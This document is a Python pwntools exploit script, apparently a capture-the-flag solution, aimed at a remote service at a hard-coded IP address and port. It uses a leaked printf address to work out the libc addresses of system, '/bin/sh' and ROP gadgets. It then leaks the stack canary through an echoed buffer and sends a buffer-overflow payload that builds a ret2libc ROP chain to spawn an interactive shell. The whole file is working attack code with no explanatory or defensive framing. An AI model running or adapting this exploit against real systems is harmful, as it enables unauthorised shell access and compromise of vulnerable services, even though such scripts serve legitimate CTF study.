from pwn import *

libc_path = "/usr/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc_path)
rop = ROP(libc)

target = remote('65.109.185.193',5002)

print(rop.find_gadget(['pop rdi', 'ret'])[0])
print(rop.find_gadget(['ret'])[0])
print(libc.symbols['printf'])
print(libc.symbols['system'])
print(next(libc.search(b'/bin/sh')))

printf_minus_system = 63872
printf_minus_binsh = -1539976
printf_minus_poprdiret_gadget = 221963
printf_minus_ret = 226743

target.recvuntil(b'The address of printf is ')
printf_addr = target.recvline()
printf_addr = int(printf_addr[2:-1], 16)

system_addr = printf_addr - printf_minus_system
binsh_addr = printf_addr - printf_minus_binsh
gadget_addr = printf_addr - printf_minus_poprdiret_gadget
ret_addr = printf_addr - printf_minus_ret

buffer_string = b'aaaaaaaaaaaaaaaaaaaMEDPT'

target.recvuntil(b'4- Herasat')
target.sendline(b'3')
target.recvuntil(b'MEDPT 2)')
target.sendline(buffer_string)
target.recvuntil(b'your input is ')

canary = target.recvline()
canary = b'\x00' + canary[:7]

overflow_string = buffer_string + canary + b'aaaaaaaa' + p64(ret_addr) + p64(gadget_addr) + p64(binsh_addr) + p64(system_addr)

target.recvuntil(b'4- Herasat')
target.sendline(b'3')
target.recvuntil(b'MEDPT 2)')
target.sendline(overflow_string)
target.recv()

target.interactive()



















